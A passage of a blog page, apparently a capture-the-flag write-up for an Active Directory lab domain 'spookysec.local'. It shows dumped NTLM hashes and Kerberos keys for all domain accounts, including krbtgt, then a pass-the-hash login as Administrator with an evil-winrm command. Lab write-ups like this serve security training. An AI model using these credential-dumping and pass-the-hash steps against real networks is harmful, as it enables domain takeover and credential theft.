+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:b138fbf66ab1b3a239128a02ffbd98da:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
+Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
+Administrator:des-cbc-md5:2079ce0e5df189ad
+krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
+krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
+krbtgt:des-cbc-md5:b94f97e97fabbf5d
+spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
+spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
+spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
+spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
+spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
+spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
+spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
+spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
+spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
+spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
+spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
+spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
+spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
+spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
+spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
+spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
+spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
+spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
+spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
+spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
+spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
+spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
+spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
+spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
+spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
+spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
+spookysec.local\paradox:des-cbc-md5:83988983f8b34019
+spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
+spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
+spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
+spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
+spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
+spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
+spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
+spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
+spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
+spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
+spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
+spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
+spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
+spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
+spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
+ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:7c3276f4004e5c55fe8685294181bdadbea58796c616a8903eff870c9d7d484b
+ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:e2207c3388c37fec738395fbc106f843
+ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
+[*] Cleaning up...
+</code></pre>
+<p>Now what do we have here? Well we have a ton of secrets, including:</p>
+<ul>
+<li>NTLM hashes of all the users within the domain</li>
+<li>Kerberos keys for users within the domain</li>
+</ul>
+<p>We can also see that it used the <em>DRSUAPI</em> method in order to dump the secrets.</p>
+<p>We can now use these password hashes in a <strong>Pass The Hash</strong> attack in order to login remotely to the system using any of these usernames &amp; hash combinations! The tool <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> gives us exactly what we need to perform this attack!</p>
+<p>For example, say we wanted to login as the <code>Administrator</code> user, we simply grab the hash which is <code>0e0363213e37b94221497260b0bcb4fc</code>:</p>
+<p><code>evil-winrm -i &lt;INSERT IP ADDRESS&gt; -u administrator -H 0e0363213e37b94221497260b0bcb4fc</code></p>
+<p><img src="https://i.imgur.com/3YTtAew.png" alt=""></p>
+<p>And we got the root flag!</p>
+
+  </main>
+
+          
+            <footer role="contentinfo">
+  <div
+  
+  >
+    <label for="themer">
+      dark theme: <input type="checkbox" id="themer" class="vh">
+      
+      <span aria-hidden="true"></span>
+    </label>
+  </div>
+  
+    Checkout my <a href="https://github.com/1d8">Github!</a>
+  
+</footer>
+
+          
+        </div>
+      </div>
+    </div>
+    
+
+<script src="/js/dom-scripts.js"></script>  
+
+<script src="/js/prism.js"></script>
+
+
+
+<script src="/js/search.7aef046a0cc8b0c532f1d20087b920459bc868c936bb48a6ae221eceefca2d07.js"></script>
+
+<link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>
+
+
+
+  <script src="/js/custom_01.js"></script>
+
+  <script src="/js/custom_02.js"></script>
+
+
+    
+    
+  
+
+  </body>
+</html>
